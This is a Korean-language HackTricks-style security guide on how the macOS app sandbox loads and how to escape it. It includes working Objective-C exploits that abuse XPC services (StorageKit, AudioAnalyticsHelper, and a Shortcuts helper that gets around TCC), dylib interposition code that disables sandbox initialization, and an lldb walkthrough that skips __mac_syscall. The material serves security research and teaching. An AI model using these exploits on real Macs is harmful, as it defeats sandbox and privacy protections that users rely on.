# macOS Sandbox Debug & Bypass

{{#include ../../../../../banners/hacktricks-training.md}}

## Sandbox loading process

<figure><img src="../../../../../images/image (901).png" alt=""><figcaption><p>Image from <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

이전 이미지에서 **샌드박스가 어떻게 로드되는지** 관찰할 수 있습니다. 이는 **`com.apple.security.app-sandbox`** 권한이 있는 애플리케이션이 실행될 때 발생합니다.

컴파일러는 `/usr/lib/libSystem.B.dylib`를 바이너리에 링크합니다.

그런 다음, **`libSystem.B`**는 여러 다른 함수를 호출하여 **`xpc_pipe_routine`**이 앱의 권한을 **`securityd`**에 전송할 때까지 진행합니다. Securityd는 프로세스가 샌드박스 내에서 격리되어야 하는지 확인하고, 그렇다면 격리합니다.\
마지막으로, 샌드박스는 **`__sandbox_ms`**에 대한 호출로 활성화되며, 이는 **`__mac_syscall`**을 호출합니다.

## Possible Bypasses

### Bypassing quarantine attribute

**샌드박스화된 프로세스에 의해 생성된 파일**은 샌드박스 탈출을 방지하기 위해 **격리 속성**이 추가됩니다. 그러나 샌드박스화된 애플리케이션 내에서 **격리 속성이 없는 `.app` 폴더를 생성**할 수 있다면, 앱 번들 바이너리를 **`/bin/bash`**로 가리키게 하고 **plist**에 몇 가지 환경 변수를 추가하여 **`open`**을 악용하여 **새 앱을 샌드박스 없이 실행**할 수 있습니다.

이것은 [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)**에서 수행된 작업입니다.**

> [!CAUTION]
> 따라서 현재로서는 **격리 속성이 없는 `.app`**로 끝나는 이름의 폴더를 생성할 수 있다면, 샌드박스를 탈출할 수 있습니다. macOS는 **`.app` 폴더**와 **주 실행 파일**에서만 **격리** 속성을 **확인**하기 때문입니다 (그리고 우리는 주 실행 파일을 **`/bin/bash`**로 가리키게 할 것입니다).
>
> 이미 실행할 수 있도록 승인된 .app 번들이 있다면 (실행 승인 플래그가 있는 격리 xttr가 있는 경우), 그것을 악용할 수도 있습니다... 단, 이제는 샌드박스 높은 권한 내에서는 **`.app`** 번들 내에 쓸 수 없습니다.

### Abusing Open functionality

[**Word 샌드박스 우회에 대한 마지막 예시**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv)에서 **`open`** CLI 기능이 샌드박스를 우회하는 데 어떻게 악용될 수 있는지 확인할 수 있습니다.

{{#ref}}
macos-office-sandbox-bypasses.md
{{#endref}}

### Launch Agents/Daemons

애플리케이션이 **샌드박스화되도록 설계되었더라도** (`com.apple.security.app-sandbox`), 예를 들어 **LaunchAgent** (`~/Library/LaunchAgents`)에서 실행되면 샌드박스를 우회할 수 있습니다.\
[**이 게시물**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)에서 설명한 바와 같이, 샌드박스화된 애플리케이션으로 지속성을 얻으려면 LaunchAgent로 자동 실행되도록 만들고 DyLib 환경 변수를 통해 악성 코드를 주입할 수 있습니다.

### Abusing Auto Start Locations

샌드박스화된 프로세스가 **나중에 샌드박스 없이 실행될 애플리케이션이 바이너리를 실행할 위치에 쓸 수 있다면**, 그곳에 바이너리를 배치하여 **탈출할 수 있습니다**. 이러한 위치의 좋은 예는 `~/Library/LaunchAgents` 또는 `/System/Library/LaunchDaemons`입니다.

이를 위해서는 **2단계**가 필요할 수 있습니다: **더 관대 한 샌드박스** (`file-read*`, `file-write*`)를 가진 프로세스를 실행하여 실제로 **샌드박스 없이 실행될 위치에** 코드를 작성하게 합니다.

**자동 시작 위치**에 대한 이 페이지를 확인하세요:

{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

### Abusing other processes

샌드박스 프로세스에서 **덜 제한적인 샌드박스**(또는 없는 샌드박스)에서 실행 중인 다른 프로세스를 **타격할 수 있다면**, 그들의 샌드박스를 탈출할 수 있습니다:

{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

### Available System and User Mach services

샌드박스는 또한 프로필 `application.sb`에 정의된 특정 **Mach 서비스**와 XPC를 통해 통신할 수 있도록 허용합니다. 이러한 서비스 중 하나를 **악용**할 수 있다면 **샌드박스를 탈출할 수 있습니다**.

[이 글](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)에서 언급된 바와 같이, Mach 서비스에 대한 정보는 `/System/Library/xpc/launchd.plist`에 저장됩니다. `<string>System</string>` 및 `<string>User</string>`를 해당 파일 내에서 검색하여 모든 시스템 및 사용자 Mach 서비스를 찾을 수 있습니다.

또한, `bootstrap_look_up`을 호출하여 샌드박스화된 애플리케이션에 Mach 서비스가 사용 가능한지 확인할 수 있습니다.
```objectivec
void checkService(const char *serviceName) {
mach_port_t service_port = MACH_PORT_NULL;
kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port);
if (!err) {
NSLog(@"available service:%s", serviceName);
mach_port_deallocate(mach_task_self_, service_port);
}
}

void print_available_xpc(void) {
NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"];
for (NSString* key in launchDaemons) {
NSDictionary<NSString*, id>* job = launchDaemons[key];
NSDictionary<NSString*, id>* machServices = job[@"MachServices"];
for (NSString* serviceName in machServices) {
checkService(serviceName.UTF8String);
}
}
}
```
### 사용 가능한 PID Mach 서비스

이 Mach 서비스는 처음에 [이 문서에서 샌드박스를 탈출하는 데 악용되었습니다](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/). 그 당시, **애플리케이션과 그 프레임워크에서 요구되는 모든 XPC 서비스**가 앱의 PID 도메인에서 볼 수 있었습니다(이들은 `ServiceType`이 `Application`인 Mach 서비스입니다).

**PID 도메인 XPC 서비스에 연락하기 위해서는**, 앱 내에서 다음과 같은 한 줄로 등록하기만 하면 됩니다:
```objectivec
[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
```
또한, `<string>Application</string>`에 대해 `System/Library/xpc/launchd.plist` 내에서 검색하여 모든 **Application** Mach 서비스를 찾는 것이 가능합니다.

유효한 xpc 서비스를 찾는 또 다른 방법은 다음의 서비스를 확인하는 것입니다:
```bash
find /System/Library/Frameworks -name "*.xpc"
find /System/Library/PrivateFrameworks -name "*.xpc"
```
여러 가지 이 기술을 악용한 예시는 [**원본 작성물**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)에서 찾을 수 있지만, 다음은 요약된 몇 가지 예입니다.

#### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc

이 서비스는 항상 `YES`를 반환하여 모든 XPC 연결을 허용하며, 메서드 `runTask:arguments:withReply:`는 임의의 명령을 임의의 매개변수로 실행합니다.

익스플로잇은 "매우 간단했다":
```objectivec
@protocol SKRemoteTaskRunnerProtocol
-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
@end

void exploit_storagekitfsrunner(void) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
[conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
[conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
[conn resume];

[[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
NSLog(@"run task result:%@, error:%@", bSucc, error);
}];
}
```
#### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc

이 XPC 서비스는 항상 YES를 반환하여 모든 클라이언트를 허용했으며, 메서드 `createZipAtPath:hourThreshold:withReply:`는 기본적으로 압축할 폴더의 경로를 지정할 수 있게 해주었습니다. 그러면 ZIP 파일로 압축됩니다.

따라서 가짜 앱 폴더 구조를 생성하고 압축한 다음, 이를 풀고 실행하여 샌드박스를 탈출할 수 있습니다. 새로운 파일은 격리 속성이 없기 때문입니다.

익스플로잇은:
```objectivec
@protocol AudioAnalyticsHelperServiceProtocol
-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
@end
void exploit_AudioAnalyticsHelperService(void) {
NSString *currentPath = NSTemporaryDirectory();
chdir([currentPath UTF8String]);
NSLog(@"======== preparing payload at the current path:%@", currentPath);
system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
[@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
system("chmod +x compressed/poc.app/Contents/MacOS/poc");

[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
[conn resume];

[[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
NSString *file;
while ((file = [dirEnum nextObject])) {
if ([[file pathExtension] isEqualToString: @"zip"]) {
// open the zip
NSString *cmd = [@"open " stringByAppendingString:file];
system([cmd UTF8String]);

sleep(3); // wait for decompression and then open the payload (poc.app)
NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
system([cmd2 UTF8String]);
break;
}
}
}];
}
```
#### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc

이 XPC 서비스는 `extendAccessToURL:completion:` 메서드를 통해 XPC 클라이언트에 임의의 URL에 대한 읽기 및 쓰기 액세스를 제공합니다. XPC 서비스가 FDA를 가지고 있기 때문에 이러한 권한을 악용하여 TCC를 완전히 우회할 수 있습니다.

익스플로잇은:
```objectivec
@protocol WFFileAccessHelperProtocol
- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
@end
typedef int (*PFN)(const char *);
void expoit_ShortcutsFileAccessHelper(NSString *target) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
[conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
[conn resume];

[[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
NSURL *targetURL = [fpWrapper url];

void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
else {
NSLog(@"Got the file R&W permission with sandbox token:%@", sbxToken);
NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
}
}];
}
```
### 정적 컴파일 및 동적 링크

[**이 연구**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)는 샌드박스를 우회하는 2가지 방법을 발견했습니다. 샌드박스는 **libSystem** 라이브러리가 로드될 때 사용자 공간에서 적용됩니다. 이진 파일이 이를 로드하는 것을 피할 수 있다면, 샌드박스에 걸리지 않을 것입니다:

- 이진 파일이 **완전히 정적으로 컴파일**되었다면, 해당 라이브러리를 로드하는 것을 피할 수 있습니다.
- **이진 파일이 어떤 라이브러리도 로드할 필요가 없다면** (링커도 libSystem에 있기 때문에), libSystem을 로드할 필요가 없습니다.

### 셸코드

**셸코드**조차도 ARM64에서는 `libSystem.dylib`에 링크되어야 합니다:
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### 상속되지 않는 제한

**[이 글의 보너스](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)**에서 설명된 것처럼, 샌드박스 제한은 다음과 같습니다:
```
(version 1)
(allow default)
(deny file-write* (literal "/private/tmp/sbx"))
```
새 프로세스가 예를 들어 실행됨으로써 우회될 수 있습니다:
```bash
mkdir -p /tmp/poc.app/Contents/MacOS
echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
chmod +x /tmp/poc.app/Contents/MacOS/poc
open /tmp/poc.app
```
그러나 물론 이 새로운 프로세스는 부모 프로세스의 권한이나 특권을 상속받지 않습니다.

### 권한

어떤 **작업**이 특정 **권한**이 있는 애플리케이션의 경우 **샌드박스**에 의해 **허용될 수** 있다는 점에 유의하십시오.
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### Interposting Bypass

**Interposting**에 대한 자세한 정보는 다음을 확인하세요:

{{#ref}}
../../../macos-proces-abuse/macos-function-hooking.md
{{#endref}}

#### 샌드박스를 방지하기 위해 `_libsecinit_initializer`를 인터포스트합니다.
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### Interpost `__mac_syscall`로 샌드박스 방지
```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### lldb로 Sandbox 디버그 및 우회

샌드박스되어야 하는 애플리케이션을 컴파일해 보겠습니다:

{{#tabs}}
{{#tab name="sand.c"}}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{{#endtab}}

{{#tab name="entitlements.xml"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="Info.plist"}}
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

그런 다음 앱을 컴파일합니다:
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
> [!CAUTION]
> 이 앱은 **`~/Desktop/del.txt`** 파일을 **읽으려고** 할 것이며, **Sandbox는 이를 허용하지 않습니다**.\
> Sandbox가 우회된 후 읽을 수 있도록 그곳에 파일을 생성하세요:
>
> ```bash
> echo "Sandbox Bypassed" > ~/Desktop/del.txt
> ```

애플리케이션을 디버깅하여 Sandbox가 언제 로드되는지 확인해 봅시다:
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```
> [!WARNING] > **샌드박스를 우회하더라도 TCC**는 사용자가 프로세스가 데스크탑에서 파일을 읽는 것을 허용할지 물어볼 것입니다.

## References

- [http://newosxbook.com/files/HITSB.pdf](http://newosxbook.com/files/HITSB.pdf)
- [https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
- [https://www.youtube.com/watch?v=mG715HcDgO8](https://www.youtube.com/watch?v=mG715HcDgO8)

{{#include ../../../../../banners/hacktricks-training.md}}
